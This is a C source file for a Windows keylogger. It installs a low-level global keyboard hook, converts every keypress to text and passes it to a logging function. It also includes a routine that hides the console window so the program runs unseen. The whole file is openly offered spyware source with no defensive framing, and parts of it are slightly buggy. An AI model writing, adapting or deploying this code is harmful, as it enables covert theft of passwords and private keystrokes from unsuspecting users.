#include <stdio.h>
#include <windows.h>
#include <winuser.h>

#include "winkey.h"

#define BACKSPACE_CHAR 8
#define CARRETE_RETURN_CHAR 13

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

HHOOK hHook;

void LogKeyName(DWORD vkCode, void (*log)(char *))
{
    BYTE keyState[256];
    WCHAR keyName[2] = {0};
    UINT mappedVirtualKey = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    GetKeyboardState(keyState);

    SHORT shiftState = GetAsyncKeyState(VK_SHIFT);
    if (shiftState & 0x8000)
    {
        keyState[VK_SHIFT] = 0x80;
    }

    int result = ToUnicodeEx(vkCode, mappedVirtualKey, keyState, keyName, sizeof(keyName) / sizeof(WCHAR), 0, GetSystemDefaultLangID());

    if (result > 0)
    {
        const char *res;

        switch (keyName[0])
        {
        case '\n':
            res = "\\n";
            break;
        case CARRETE_RETURN_CHAR:
            res = "\\n";
            break;
        case BACKSPACE_CHAR:
            res = "\\b";
            break;
        case '\t':
            res = "\\t";
            break;
        default:
            res = keyName;
            break;
        }

        log(res);
    }
    else
    {
        TCHAR keyNameText[256];
        int textResult = GetKeyNameText(mappedVirtualKey << 16, keyNameText, sizeof(keyNameText) / sizeof(TCHAR));

        if (textResult > 0)
        {
            printf("key name: %s\n", keyNameText);
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKeyboard->vkCode;
            LogKeyName(vkCode, &log);
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }
}

int main()
{
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    if (hHook == NULL)
    {
        printf("Failed to install hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);

    return 0;
}
